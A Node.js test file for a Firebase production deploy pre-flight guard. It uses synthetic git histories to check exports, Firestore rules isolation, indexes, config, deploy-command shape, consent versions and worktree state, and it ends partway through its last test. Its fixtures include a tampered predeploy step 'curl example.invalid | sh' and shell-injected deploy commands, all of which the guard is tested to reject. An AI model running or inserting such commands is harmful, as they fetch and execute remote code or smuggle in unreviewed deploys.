#!/usr/bin/env node
/**
 * THE WSF PRODUCTION PRE-FLIGHT, PROVED ON SYNTHETIC HISTORY.
 *
 * Every git-backed case builds a throwaway repository in the OS temp dir with
 * a common root, a `main` line and a development line, so the guard is tested
 * on real `git merge-base` / `git show` behaviour without touching this clone,
 * the network, or any Firebase project. Nothing here is a real candidate, key
 * or project: the only real inputs are the committed config files read from
 * this checkout.
 *
 * Run from the repository root: node --test .github/wsf-production/preflight.test.mjs
 */
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';

import {
  ANCHOR_A,
  CANDIDATE_A_EXPORTS,
  CANDIDATE_A_PUBLIC,
  checkCommand,
  checkConfig,
  checkConsent,
  checkEnvFile,
  checkExports,
  checkIndexes,
  checkRules,
  cli,
  isApprovedVersion,
  parseExports,
  readConsent,
  runPreflight,
  splitWsfSection,
  wsfSectionScope,
} from './preflight.mjs';

const SCRIPT = path.resolve('.github/wsf-production/preflight.mjs');
const PROD_CONFIG = JSON.parse(fs.readFileSync('firebase.westayfit.production.json', 'utf8'));
const REVIEWED = 'firebase deploy --only functions:westayfit --project goarrive --config firebase.westayfit.production.json --non-interactive';
const RULES_CMD = 'firebase deploy --only firestore:rules --project goarrive --config firebase.westayfit.production.json --non-interactive';
/** A synthetic env file: the reviewed URL and a made-up sender on the WSF domain. No real value. */
const GOOD_ENV = 'WSF_EMAIL_FROM="Synthetic Sender <synthetic@westay.fit>"\nWSF_APP_URL=https://app.westay.fit\n';
const failed = (checks) => checks.filter((c) => !c.ok).map((c) => c.id);

// ── synthetic sources ───────────────────────────────────────────────────────

const GOARRIVE_RULES = [
  "rules_version = '2';",
  'service cloud.firestore {',
  '  match /databases/{database}/documents {',
  '    match /coaches/{coachId} {',
  '      allow read: if request.auth != null;',
  '    }',
  '',
  '    match /{document=**} {',
  '      allow read, write: if false;',
  '    }',
  '  }',
  '}',
  '',
].join('\n');

const WSF_SECTION = [
  '    // ─────────────────────────────────────────────',
  '    // WE STAY FIT (WSF) — universal communities app',
  '    // ─────────────────────────────────────────────',
  '    match /wsfMemberProfiles/{uid} {',
  '      allow read: if request.auth.uid == uid;',
  '    }',
  '',
].join('\n');

const withWsf = (rules, section = WSF_SECTION) => rules.replace('    match /{document=**} {', `${section}\n    match /{document=**} {`);

const GOARRIVE_INDEX = { collectionGroup: 'coaches', queryScope: 'COLLECTION', fields: [{ fieldPath: 'a', order: 'ASCENDING' }, { fieldPath: 'b', order: 'DESCENDING' }] };
const WSF_INDEX = { collectionGroup: 'wsfContributions', queryScope: 'COLLECTION', fields: [{ fieldPath: 'communityGroupId', order: 'ASCENDING' }, { fieldPath: 'createdAt', order: 'DESCENDING' }] };
const FIELD_OVERRIDE = { collectionGroup: 'sessions', fieldPath: 'notes', indexes: [] };
const MAIN_INDEXES = { indexes: [GOARRIVE_INDEX], fieldOverrides: [FIELD_OVERRIDE] };
const CAND_INDEXES = { indexes: [GOARRIVE_INDEX, WSF_INDEX], fieldOverrides: [FIELD_OVERRIDE] };

function indexTs(names = CANDIDATE_A_EXPORTS, publicNames = CANDIDATE_A_PUBLIC, consent = 'pending-approval-2026-08-25', extra = '') {
  const head = [
    "import { onCall } from 'firebase-functions/v2/https';",
    "// invoker: 'public' in a comment is not a declaration.",
    `const WSF_ACCEPTED_TERMS_VERSION = '${consent}';`,
    `const WSF_ACCEPTED_PRIVACY_VERSION = '${consent}';`,
  ];
  const body = names.map((n) => `export const ${n} = onCall(\n  { region: 'us-central1'${publicNames.includes(n) ? ", invoker: 'public'" : ''} },\n  async () => ({ ok: true })\n);`);
  return [...head, ...body, extra].join('\n') + '\n';
}
const profileConstants = (terms = 'pending-approval-2026-08-25', privacy = terms) =>
  `export const WSF_ACCEPTED_TERMS_VERSION = '${terms}';\nexport const WSF_ACCEPTED_PRIVACY_VERSION = '${privacy}';\n`;

// ── synthetic git history ───────────────────────────────────────────────────

function git(dir, ...args) {
  return execFileSync('git', ['-C', dir, ...args], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
}
function write(dir, files) {
  for (const [rel, text] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), typeof text === 'string' ? text : JSON.stringify(text, null, 2));
  }
}
function commit(dir, files, message) {
  write(dir, files);
  git(dir, 'add', '-A');
  git(dir, '-c', 'user.email=synthetic@example.invalid', '-c', 'user.name=synthetic', 'commit', '-q', '-m', message);
  return git(dir, 'rev-parse', 'HEAD');
}

/** root → main (GoArrive only, one WSF export) and root → A (the WSF backend). */
function history() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wsf-preflight-'));
  git(dir, 'init', '-q', '-b', 'root');
  const root = commit(dir, {
    'firestore.rules': GOARRIVE_RULES,
    'firestore.indexes.json': MAIN_INDEXES,
    'firebase.westayfit.production.json': PROD_CONFIG,
    'functions-westayfit/src/index.ts': indexTs(['wsfHealth'], []),
    'apps/westayfit/src/profileConstants.ts': profileConstants(),
  }, 'root');
  git(dir, 'checkout', '-q', '-b', 'main');
  const main = commit(dir, { 'README.md': 'operational main\n' }, 'main');
  git(dir, 'checkout', '-q', '-b', 'dev', root);
  const anchor = commit(dir, {
    'firestore.rules': withWsf(GOARRIVE_RULES),
    'firestore.indexes.json': CAND_INDEXES,
    'functions-westayfit/src/index.ts': indexTs(),
  }, 'A: the WSF backend');
  return { dir, root, main, anchor, worktrees: new Map() };
}
/**
 * A detached worktree at `sha`, laid out the way the runbook leaves it: the
 * production config copied in and the env file written, nothing else.
 */
function worktreeAt(h, sha, env = GOOD_ENV) {
  const key = `${sha}:${env}`;
  if (!h.worktrees.has(key)) {
    const wt = fs.mkdtempSync(path.join(os.tmpdir(), 'wsf-preflight-wt-'));
    fs.rmSync(wt, { recursive: true });
    git(h.dir, 'worktree', 'add', '-q', '--detach', wt, sha);
    write(wt, { 'firebase.westayfit.production.json': PROD_CONFIG });
    if (env !== null) write(wt, { 'functions-westayfit/.env.goarrive': env });
    h.worktrees.set(key, wt);
  }
  return h.worktrees.get(key);
}
const run = (h, over = {}) => {
  const candidate = over.candidate ?? h.anchor;
  const worktree = 'worktree' in over ? over.worktree : worktreeAt(h, candidate);
  const envFile = 'envFile' in over ? over.envFile : GOOD_ENV;
  return runPreflight({ repo: h.dir, record: 'A', candidate, main: h.main, anchor: h.anchor, config: PROD_CONFIG, command: REVIEWED, ...over, worktree, envFile });
};

// ── exports ─────────────────────────────────────────────────────────────────

test('exports: the manifest is 59 names with 17 public, matching the reviewed inventory', () => {
  assert.equal(CANDIDATE_A_EXPORTS.length, 59);
  assert.equal(new Set(CANDIDATE_A_EXPORTS).size, 59);
  assert.equal(CANDIDATE_A_PUBLIC.length, 17);
  assert.ok(CANDIDATE_A_PUBLIC.every((n) => CANDIDATE_A_EXPORTS.includes(n)));
});

test('exports: comments are not declarations; re-exports count; a wildcard is refused', () => {
  const src = `/* export const wsfGhost = onCall( */\n// export const wsfAlsoGhost = onCall(\n${indexTs(['wsfA', 'wsfB'], ['wsfB'])}export { wsfC, wsfD as wsfE } from './mod';\n`;
  const r = parseExports(src);
  assert.deepEqual(r.names, ['wsfA', 'wsfB', 'wsfC', 'wsfE']);
  assert.deepEqual(r.publicNames, ['wsfB']);
  assert.equal(r.wildcard, false);
  assert.equal(parseExports(`export * from './x';\n`).wildcard, true);
  assert.deepEqual(failed(checkExports(`export * from './x';\n${indexTs()}`)), ['exports.no-wildcard']);
});

test('exports: a missing, an extra, a duplicated or a newly public export is refused', () => {
  assert.deepEqual(failed(checkExports(indexTs())), []);
  assert.deepEqual(failed(checkExports(indexTs(CANDIDATE_A_EXPORTS.slice(1)))), ['exports.match-manifest']);
  assert.deepEqual(failed(checkExports(indexTs([...CANDIDATE_A_EXPORTS, 'wsfCreateEvent']))), ['exports.match-manifest']);
  assert.deepEqual(failed(checkExports(indexTs([...CANDIDATE_A_EXPORTS, 'wsfHealth']))), ['exports.match-manifest']);
  assert.deepEqual(failed(checkExports(indexTs(CANDIDATE_A_EXPORTS, [...CANDIDATE_A_PUBLIC, 'wsfSaveProfile']))), ['exports.public-invokers']);
  assert.deepEqual(failed(checkExports(indexTs(CANDIDATE_A_EXPORTS, CANDIDATE_A_PUBLIC.slice(1)))), ['exports.public-invokers']);
  // Operational main today: one export.
  assert.deepEqual(failed(checkExports(indexTs(['wsfHealth'], []))), ['exports.match-manifest', 'exports.public-invokers']);
});

// ── rules ───────────────────────────────────────────────────────────────────

test('rules: main plus the WSF section passes; the section is split exactly', () => {
  const cand = withWsf(GOARRIVE_RULES);
  assert.equal(splitWsfSection(cand).outside, GOARRIVE_RULES);
  assert.equal(splitWsfSection(GOARRIVE_RULES).section, '');
  assert.deepEqual(failed(checkRules(cand, GOARRIVE_RULES)), []);
});

test('rules: any change outside the WSF section is refused, however small', () => {
  const cand = withWsf(GOARRIVE_RULES).replace('request.auth != null', 'true');
  assert.deepEqual(failed(checkRules(cand, GOARRIVE_RULES)), ['rules.outside-wsf-equals-main']);
  assert.deepEqual(failed(checkRules(withWsf(GOARRIVE_RULES) + ' ', GOARRIVE_RULES)), ['rules.outside-wsf-equals-main']);
});

test('rules: a non-wsf match inside the WSF section is refused', () => {
  const sneaky = `${WSF_SECTION}    match /coaches/{coachId} {\n      allow write: if true;\n    }\n`;
  assert.deepEqual(failed(checkRules(withWsf(GOARRIVE_RULES, sneaky), GOARRIVE_RULES)), ['rules.wsf-section-wsf-only']);
});

test('rules: a WSF section that reaches past wsf* collections is refused, however it is spelled', () => {
  for (const sneaky of [
    `${WSF_SECTION}    match /{c}/{d} {\n      allow read, write: if true;\n    }\n`,
    `${WSF_SECTION}    match /{path=**} {\n      allow read, write: if true;\n    }\n`,
    `${WSF_SECTION}    match\t/coaches/{id} {\n      allow write: if true;\n    }\n`,
    `${WSF_SECTION}    match  /coaches/{id} {\n      allow write: if true;\n    }\n`,
    `${WSF_SECTION}    match /wsfX/{id} { allow read: if true; } match /coaches/{id} { allow write: if true; }\n`,
    `${WSF_SECTION}    match /wsfX {\n      allow read: if true;\n    }\n`,
  ]) assert.deepEqual(failed(checkRules(withWsf(GOARRIVE_RULES, sneaky), GOARRIVE_RULES)), ['rules.wsf-section-wsf-only'], sneaky);
  // A stray brace can close the documents block from inside the section.
  const escape = `${WSF_SECTION}    }\n`;
  assert.ok(failed(checkRules(withWsf(GOARRIVE_RULES, escape), GOARRIVE_RULES)).includes('rules.wsf-section-wsf-only'));
  assert.equal(wsfSectionScope(escape).balanced, false);
  // A commented-out match is not a rule.
  assert.equal(wsfSectionScope(`${WSF_SECTION}    // match /coaches/{id} { allow write: if true; }\n`).ok, true);
});

test('rules: a missing or misplaced catch-all deny is refused', () => {
  const noCatchAll = withWsf(GOARRIVE_RULES).replace('    match /{document=**} {\n      allow read, write: if false;\n    }\n', '');
  assert.ok(failed(checkRules(noCatchAll, GOARRIVE_RULES)).includes('rules.catch-all-last'));
  const afterCatchAll = GOARRIVE_RULES.replace('  }\n}\n', `    match /wsfLate/{id} {\n      allow read: if true;\n    }\n  }\n}\n`);
  assert.ok(failed(checkRules(afterCatchAll, GOARRIVE_RULES)).includes('rules.catch-all-last'));
  const spacedAfter = GOARRIVE_RULES.replace('  }\n}\n', `    match  /coaches/{id} {\n      allow write: if true;\n    }\n  }\n}\n`);
  assert.ok(failed(checkRules(withWsf(spacedAfter), spacedAfter)).includes('rules.catch-all-last'));
});

test('rules: the live ruleset gates the rules step only when it equals main outside the WSF section', () => {
  const cand = withWsf(GOARRIVE_RULES);
  assert.deepEqual(failed(checkRules(cand, GOARRIVE_RULES, GOARRIVE_RULES)), []);
  assert.deepEqual(failed(checkRules(cand, GOARRIVE_RULES, cand)), []);
  const drifted = checkRules(cand, GOARRIVE_RULES, GOARRIVE_RULES.replace('coaches', 'trainers'));
  assert.deepEqual(failed(drifted), ['rules.live-outside-wsf-equals-main']);
  assert.match(drifted.at(-1).detail, /outside-section line 4: live .*trainers.* vs main .*coaches/);
  // An older live WSF section is fine; a live WSF section holding a GoArrive rule is not.
  const olderLive = withWsf(GOARRIVE_RULES, WSF_SECTION.replace('request.auth.uid == uid', 'true'));
  assert.deepEqual(failed(checkRules(cand, GOARRIVE_RULES, olderLive)), []);
  const hiddenLive = withWsf(GOARRIVE_RULES, `${WSF_SECTION}    match /coaches/{id} {\n      allow write: if true;\n    }\n`);
  assert.deepEqual(failed(checkRules(cand, GOARRIVE_RULES, hiddenLive)), ['rules.live-outside-wsf-equals-main']);
});

// ── indexes ─────────────────────────────────────────────────────────────────

test('indexes: additive wsf composites pass; dropping, changing or adding non-wsf is refused', () => {
  assert.deepEqual(failed(checkIndexes(CAND_INDEXES, MAIN_INDEXES)), []);
  assert.deepEqual(failed(checkIndexes({ ...CAND_INDEXES, indexes: [WSF_INDEX] }, MAIN_INDEXES)), ['indexes.additive']);
  const changed = { ...GOARRIVE_INDEX, fields: [GOARRIVE_INDEX.fields[1], GOARRIVE_INDEX.fields[0]] };
  assert.deepEqual(failed(checkIndexes({ ...CAND_INDEXES, indexes: [changed, WSF_INDEX] }, MAIN_INDEXES)).sort(), ['indexes.additive', 'indexes.wsf-only-additions']);
  const goarriveAdd = { ...GOARRIVE_INDEX, collectionGroup: 'sessions' };
  assert.deepEqual(failed(checkIndexes({ ...CAND_INDEXES, indexes: [...CAND_INDEXES.indexes, goarriveAdd] }, MAIN_INDEXES)), ['indexes.wsf-only-additions']);
  assert.deepEqual(failed(checkIndexes({ ...CAND_INDEXES, fieldOverrides: [] }, MAIN_INDEXES)), ['indexes.additive']);
});

// ── config ──────────────────────────────────────────────────────────────────

test('config: the committed production config passes and mirrors staging\'s functions entry', () => {
  assert.deepEqual(failed(checkConfig(PROD_CONFIG)), []);
  const staging = JSON.parse(fs.readFileSync('firebase.westayfit.staging.json', 'utf8'));
  const pick = (f) => ({ source: f.source, codebase: f.codebase, ignore: f.ignore });
  assert.deepEqual(pick(PROD_CONFIG.functions[0]), pick(staging.functions[0]));
  assert.equal(PROD_CONFIG.hosting, undefined);
  assert.equal(PROD_CONFIG.storage, undefined);
});

test('config: hosting, storage, GoArrive\'s codebase, firebase.json itself and extra keys are refused', () => {
  assert.ok(failed(checkConfig({ ...PROD_CONFIG, hosting: { site: 'westayfit-app' } })).includes('config.only-functions-and-firestore'));
  assert.ok(failed(checkConfig({ ...PROD_CONFIG, storage: { rules: 'storage.rules' } })).includes('config.only-functions-and-firestore'));
  const both = [{ source: 'functions', codebase: 'default' }, PROD_CONFIG.functions[0]];
  assert.ok(failed(checkConfig({ ...PROD_CONFIG, functions: both })).includes('config.only-westayfit-codebase'));
  assert.ok(failed(checkConfig({ ...PROD_CONFIG, functions: [{ ...PROD_CONFIG.functions[0], codebase: 'default' }] })).includes('config.only-westayfit-codebase'));
  assert.ok(failed(checkConfig({ ...PROD_CONFIG, firestore: { ...PROD_CONFIG.firestore, database: 'x' } })).includes('config.firestore-rules-and-indexes'));
  const firebaseJson = JSON.parse(fs.readFileSync('firebase.json', 'utf8'));
  assert.deepEqual(failed(checkConfig(firebaseJson)).sort(), ['config.only-functions-and-firestore', 'config.only-westayfit-codebase']);
});

// ── command ─────────────────────────────────────────────────────────────────

test('command: the reviewed functions and rules commands pass, in either flag spelling', () => {
  assert.deepEqual(failed(checkCommand(REVIEWED)), []);
  assert.deepEqual(failed(checkCommand(RULES_CMD)), []);
  assert.deepEqual(failed(checkCommand('firebase deploy --non-interactive --only=firestore:rules -P goarrive -c firebase.westayfit.production.json')), []);
});

test('command: firestore:indexes is refused (the two WSF indexes are created with gcloud)', () => {
  assert.deepEqual(failed(checkCommand(RULES_CMD.replace('firestore:rules', 'firestore:indexes'))), ['command.reviewed-shape']);
  assert.deepEqual(failed(checkCommand(REVIEWED.replace('functions:westayfit', 'functions:westayfit,firestore:indexes'))), ['command.reviewed-shape']);
});

test('command: a flag given twice is refused, because firebase-tools keeps the last one', () => {
  for (const bad of [
    `${REVIEWED} --only hosting`,
    `${REVIEWED} --only functions:default -c firebase.json`,
    `${REVIEWED} -c firebase.json`,
    `${REVIEWED} -P westayfit-staging`,
    REVIEWED.replace('--project goarrive', '-P goarrive --project westayfit-staging'),
    REVIEWED.replace('--config firebase.westayfit.production.json', '-c firebase.westayfit.production.json --config firebase.json'),
    `${REVIEWED} --non-interactive`,
    REVIEWED.replace('--project goarrive', '-P=goarrive'),
  ]) assert.deepEqual(failed(checkCommand(bad)), ['command.reviewed-shape'], bad);
  assert.match(checkCommand(`${REVIEWED} --only hosting`)[0].detail, /--only is given more than once/);
  assert.match(checkCommand(`${REVIEWED} -c firebase.json`)[0].detail, /--config is given more than once/);
});

test('command: --force, Hosting, Storage, a bare or GoArrive functions target, and a missing --only are refused', () => {
  for (const bad of [
    `${REVIEWED} --force`,
    `${REVIEWED} -f`,
    `${REVIEWED} --force=true`,
    REVIEWED.replace('functions:westayfit', 'functions:westayfit,hosting'),
    REVIEWED.replace('functions:westayfit', 'hosting:westayfit-app'),
    REVIEWED.replace('functions:westayfit', 'storage'),
    REVIEWED.replace('functions:westayfit', 'functions'),
    REVIEWED.replace('functions:westayfit', 'functions:default'),
    REVIEWED.replace('--only functions:westayfit ', ''),
  ]) assert.deepEqual(failed(checkCommand(bad)), ['command.reviewed-shape'], bad);
});

test('command: firebase.json, another project, a missing --non-interactive, another subcommand, shell syntax and stray words are refused', () => {
  for (const bad of [
    REVIEWED.replace('firebase.westayfit.production.json', 'firebase.json'),
    REVIEWED.replace(' --config firebase.westayfit.production.json', ''),
    REVIEWED.replace('goarrive', 'westayfit-staging'),
    REVIEWED.replace(' --non-interactive', ''),
    REVIEWED.replace('firebase deploy', 'firebase hosting:channel:deploy'),
    `${REVIEWED}; firebase deploy`,
    `${REVIEWED} "--force"`,
    `${REVIEWED} extra`,
    `${REVIEWED} --debug`,
  ]) assert.deepEqual(failed(checkCommand(bad)), ['command.reviewed-shape'], bad);
  // Named for what it is, not only caught by a neighbouring check.
  for (const shell of [`${REVIEWED}; firebase deploy`, `${REVIEWED} && firebase deploy --only hosting`, `${REVIEWED} $(cat x)`]) {
    assert.match(checkCommand(shell)[0].detail, /shell operators are not allowed/, shell);
  }
});

test('command: the one interactive form (#599 S2) needs its named reason, the functions target, and no --non-interactive', () => {
  const INTERACTIVE = REVIEWED.replace(' --non-interactive', '');
  assert.deepEqual(failed(checkCommand(INTERACTIVE)), ['command.reviewed-shape']);
  assert.deepEqual(failed(checkCommand(INTERACTIVE, { interactiveReason: 'minimum-bill' })), []);
  assert.match(checkCommand(INTERACTIVE, { interactiveReason: 'minimum-bill' })[0].detail, /\(interactive: minimum-bill\)/);
  for (const [cmd, reason, why] of [
    [REVIEWED, 'minimum-bill', /drop --non-interactive/],
    [RULES_CMD.replace(' --non-interactive', ''), 'minimum-bill', /applies only to --only functions:westayfit/],
    [INTERACTIVE, 'deletion', /is not reviewed/],
    [`${INTERACTIVE} --force`, 'minimum-bill', /--force is refused/],
  ]) {
    const r = checkCommand(cmd, { interactiveReason: reason });
    assert.deepEqual(failed(r), ['command.reviewed-shape'], `${cmd} / ${reason}`);
    assert.match(r[0].detail, why, `${cmd} / ${reason}`);
  }
});

// ── consent ─────────────────────────────────────────────────────────────────

test('consent: A may carry the pending version; B must carry an approved one; server and client must agree', () => {
  const pending = readConsent(indexTs(), profileConstants());
  assert.deepEqual(failed(checkConsent('A', pending)), []);
  assert.deepEqual(failed(checkConsent('B', pending)), ['consent.approved-version']);
  const approved = readConsent(indexTs(undefined, undefined, '2026-10-10'), profileConstants('2026-10-10'));
  assert.deepEqual(failed(checkConsent('B', approved)), []);
  const split = readConsent(indexTs(undefined, undefined, '2026-10-10'), profileConstants('2026-10-10', '2026-10-11'));
  assert.deepEqual(failed(checkConsent('B', split)), ['consent.server-equals-client']);
  for (const placeholder of ['', 'TBD', 'todo', 'xxx', 'pending', 'pending-legal', 'v 1']) {
    const c = readConsent(indexTs(undefined, undefined, placeholder), profileConstants(placeholder));
    assert.deepEqual(failed(checkConsent('B', c)), ['consent.approved-version'], JSON.stringify(placeholder));
    assert.equal(isApprovedVersion(placeholder), false, placeholder);
  }
  assert.equal(isApprovedVersion('2026-10-10'), true);
  assert.equal(isApprovedVersion('terms-v2.1'), true);
});

// ── env file ────────────────────────────────────────────────────────────────

test('env file: the reviewed URL and a westay.fit sender pass; anything else is refused without printing a value', () => {
  assert.deepEqual(failed(checkEnvFile(GOOD_ENV)), []);
  assert.deepEqual(failed(checkEnvFile('WSF_EMAIL_FROM=synthetic@westay.fit\nWSF_APP_URL="https://app.westay.fit"\n# a comment\n')), []);
  for (const bad of [
    '',
    'WSF_EMAIL_FROM=synthetic@westay.fit\n',
    'WSF_EMAIL_FROM=synthetic@westay.fit\nWSF_APP_URL=https://westayfit-app--staging-expired.web.app\n',
    'WSF_APP_URL=https://app.westay.fit\nWSF_EMAIL_FROM=synthetic@example.invalid\n',
    `${GOOD_ENV}WSF_EMAIL_API_KEY=synthetic-not-a-key\n`,
    `${GOOD_ENV}export SOMETHING\n`,
  ]) assert.deepEqual(failed(checkEnvFile(bad)), ['worktree.env-file'], bad);
  const detail = checkEnvFile(`${GOOD_ENV}WSF_EMAIL_API_KEY=synthetic-not-a-key\n`)[0].detail;
  assert.doesNotMatch(detail, /synthetic-not-a-key|synthetic@westay\.fit/);
});

// ── the git-backed run ──────────────────────────────────────────────────────

test('git: candidate A on its anchor passes every check and reports its pending consent version', () => {
  const h = history();
  const v = run(h);
  assert.deepEqual(failed(v.checks), []);
  assert.equal(v.ok, true);
  assert.equal(v.exports, 59);
  assert.equal(v.consentVersionPending, true);
  assert.deepEqual(v.consentVersion, { WSF_ACCEPTED_TERMS_VERSION: 'pending-approval-2026-08-25', WSF_ACCEPTED_PRIVACY_VERSION: 'pending-approval-2026-08-25' });
  for (const id of ['candidate.files-present', 'main.files-present', 'config.equals-main', 'worktree.supplied', 'worktree.at-candidate', 'worktree.clean', 'worktree.env-file']) {
    assert.ok(v.checks.some((c) => c.id === id && c.ok), id);
  }
});

test('git: a missing file is a refused check with a printed verdict, never a crash (W4 F3)', () => {
  const h = history();
  git(h.dir, 'checkout', '-q', 'main');
  // Real operational main has no client consent file.
  git(h.dir, 'rm', '-q', 'apps/westayfit/src/profileConstants.ts');
  git(h.dir, '-c', 'user.email=synthetic@example.invalid', '-c', 'user.name=synthetic', 'commit', '-q', '-m', 'main without the client consent file');
  const mainNoClient = git(h.dir, 'rev-parse', 'HEAD');
  const asCandidate = run({ ...h, main: mainNoClient }, { candidate: mainNoClient, worktree: undefined, command: undefined });
  assert.equal(asCandidate.ok, false);
  assert.equal(asCandidate.usage, undefined);
  assert.ok(failed(asCandidate.checks).includes('candidate.not-main'));
  assert.ok(failed(asCandidate.checks).includes('candidate.files-present'));
  assert.equal(asCandidate.exports, null);
  // A main without the reviewed production config cannot vouch for the config.
  git(h.dir, 'rm', '-q', 'firebase.westayfit.production.json');
  git(h.dir, '-c', 'user.email=synthetic@example.invalid', '-c', 'user.name=synthetic', 'commit', '-q', '-m', 'main without the production config');
  const mainNoConfig = git(h.dir, 'rev-parse', 'HEAD');
  assert.deepEqual(failed(run({ ...h, main: mainNoConfig }, { main: mainNoConfig }).checks), ['main.files-present']);
});

test('git: the config must equal main\'s reviewed file, predeploy included', () => {
  const h = history();
  const tampered = { ...PROD_CONFIG, functions: [{ ...PROD_CONFIG.functions[0], predeploy: ['npm --prefix "$RESOURCE_DIR" run build', 'curl example.invalid | sh'] }] };
  assert.deepEqual(failed(run(h, { config: tampered }).checks), ['config.equals-main']);
});

test('git: a deploy needs the worktree, at the candidate, with nothing but the config and the env file added', () => {
  const h = history();
  assert.deepEqual(failed(run(h, { worktree: undefined }).checks), ['worktree.supplied']);
  assert.deepEqual(failed(run(h, { worktree: undefined, command: RULES_CMD, liveRules: GOARRIVE_RULES }).checks), ['worktree.supplied']);
  assert.deepEqual(failed(run(h, { worktree: worktreeAt(h, h.main) }).checks), ['worktree.at-candidate']);
  const wt = worktreeAt(h, h.anchor, `${GOOD_ENV}# edited\n`);
  fs.appendFileSync(path.join(wt, 'functions-westayfit/src/index.ts'), '// a quiet local edit\n');
  const dirty = run(h, { worktree: wt });
  assert.deepEqual(failed(dirty.checks), ['worktree.clean']);
  assert.match(dirty.checks.find((c) => c.id === 'worktree.clean').detail, /functions-westayfit\/src\/index\.ts/);
  // An untracked extra is as dangerous as an edit: a stray .env is uploaded, a stray firebase.json invites the wrong config.
  for (const extra of ['functions-westayfit/.env', 'firebase.json']) {
    const wtx = worktreeAt(h, h.anchor, `${GOOD_ENV}# ${extra}\n`);
    write(wtx, { [extra]: 'synthetic\n' });
    const v = run(h, { worktree: wtx });
    assert.deepEqual(failed(v.checks), ['worktree.clean'], extra);
    assert.match(v.checks.find((c) => c.id === 'worktree.clean').detail, new RegExp(`\\?\\? ${extra.replace('.', '\\.')}`), extra);
  }
  const notGit = fs.mkdtempSync(path.join(os.tmpdir(), 'wsf-preflight-notgit-'));
  assert.deepEqual(failed(run(h, { worktree: notGit }).checks).sort(), ['worktree.at-candidate', 'worktree.clean']);
  assert.deepEqual(failed(run(h, { envFile: 'WSF_APP_URL=https://app.westay.fit\n' }).checks), ['worktree.env-file']);
});

test('git: the interactive form is recorded in the verdict, and a reason without a command is refused', () => {
  const h = history();
  const v = run(h, { command: REVIEWED.replace(' --non-interactive', ''), interactiveReason: 'minimum-bill' });
  assert.deepEqual(failed(v.checks), []);
  assert.equal(v.interactiveReason, 'minimum-bill');
  assert.equal(run(h).interactiveReason, undefined);
  assert.deepEqual(failed(run(h, { command: undefined, worktree: undefined, interactiveReason: 'minimum-bill' }).checks), ['command.reviewed-shape']);
});

test('git: a rules deploy needs the live ruleset, and the live ruleset must equal main outside its WSF section', () => {
  const h = history();
  const noLive = run(h, { command: RULES_CMD });
  assert.deepEqual(failed(noLive.checks), ['rules.live-ruleset-supplied']);
  assert.deepEqual(failed(run(h, { command: RULES_CMD, liveRules: GOARRIVE_RULES }).checks), []);
  assert.deepEqual(failed(run(h, { command: RULES_CMD, liveRules: GOARRIVE_RULES.replace('coaches', 'trainers') }).checks), ['rules.live-outside-wsf-equals-main']);
});

test('git: operational main as the candidate is refused, as A and as B', () => {
  const h = history();
  const a = run(h, { candidate: h.main });
  assert.equal(a.ok, false);
  assert.ok(failed(a.checks).includes('candidate.not-main'));
  assert.ok(failed(a.checks).includes('candidate.is-anchor-A'));
  assert.ok(failed(a.checks).includes('exports.match-manifest'));
  const b = run(h, { record: 'B', candidate: h.main });
  assert.ok(failed(b.checks).includes('candidate.B-descends-from-A'));
});

test('git: A must be exactly the anchor; a descendant is not A', () => {
  const h = history();
  git(h.dir, 'checkout', '-q', 'dev');
  const later = commit(h.dir, { 'notes.txt': 'later\n' }, 'later');
  assert.deepEqual(failed(run(h, { candidate: later }).checks), ['candidate.is-anchor-A']);
});

test('git: a reviewed B (consent values only) passes; pending, split, code or extra-path changes are refused', () => {
  const h = history();
  const branch = (name, files) => {
    git(h.dir, 'checkout', '-q', '-b', name, h.anchor);
    return commit(h.dir, files, name);
  };
  const good = branch('b-good', { 'functions-westayfit/src/index.ts': indexTs(undefined, undefined, '2026-10-10'), 'apps/westayfit/src/profileConstants.ts': profileConstants('2026-10-10'), 'apps/westayfit/src/legalContent.ts': 'approved text\n' });
  assert.deepEqual(failed(run(h, { record: 'B', candidate: good }).checks), []);
  assert.equal(run(h, { record: 'B', candidate: good }).consentVersionPending, false);

  // The repo moves the legal .md files with legalContent.ts, and tests pin the version string.
  const pinned = (v) => `expect(profile.acceptedTermsVersion).toBe('${v}');\n`;
  git(h.dir, 'checkout', '-q', 'dev');
  const anchorWithTests = commit(h.dir, { 'functions-westayfit/tests/callable/wsf-save-profile.test.ts': pinned('pending-approval-2026-08-25'), 'apps/westayfit/tests-e2e/e35-home.spec.ts': pinned('pending-approval-2026-08-25') }, 'A with pinned tests');
  const h2 = { ...h, anchor: anchorWithTests };
  git(h.dir, 'checkout', '-q', '-b', 'b-full', anchorWithTests);
  const full = commit(h.dir, {
    'functions-westayfit/src/index.ts': indexTs(undefined, undefined, '2026-10-10'),
    'apps/westayfit/src/profileConstants.ts': profileConstants('2026-10-10'),
    'apps/westayfit/src/legalContent.ts': 'approved text\n',
    'apps/westayfit/legal/terms.md': 'approved terms\n',
    'apps/westayfit/legal/privacy.md': 'approved privacy\n',
    'functions-westayfit/tests/callable/wsf-save-profile.test.ts': pinned('2026-10-10'),
    'apps/westayfit/tests-e2e/e35-home.spec.ts': pinned('2026-10-10'),
  }, 'b-full');
  assert.deepEqual(failed(run(h2, { record: 'B', candidate: full }).checks), []);
  git(h.dir, 'checkout', '-q', '-b', 'b-test-logic', anchorWithTests);
  const testLogic = commit(h.dir, {
    'functions-westayfit/src/index.ts': indexTs(undefined, undefined, '2026-10-10'),
    'apps/westayfit/src/profileConstants.ts': profileConstants('2026-10-10'),
    'functions-westayfit/tests/callable/wsf-save-profile.test.ts': `${pinned('2026-10-10')}it.skip('a weakened test');\n`,
  }, 'b-test-logic');
  assert.deepEqual(failed(run(h2, { record: 'B', candidate: testLogic }).checks), ['candidate.B-changes-only-consent']);

  const pending = branch('b-pending', { 'apps/westayfit/src/legalContent.ts': 'text\n' });
  assert.deepEqual(failed(run(h, { record: 'B', candidate: pending }).checks), ['consent.approved-version']);

  const split = branch('b-split', { 'functions-westayfit/src/index.ts': indexTs(undefined, undefined, '2026-10-10'), 'apps/westayfit/src/profileConstants.ts': profileConstants('2026-10-11') });
  assert.deepEqual(failed(run(h, { record: 'B', candidate: split }).checks), ['consent.server-equals-client']);

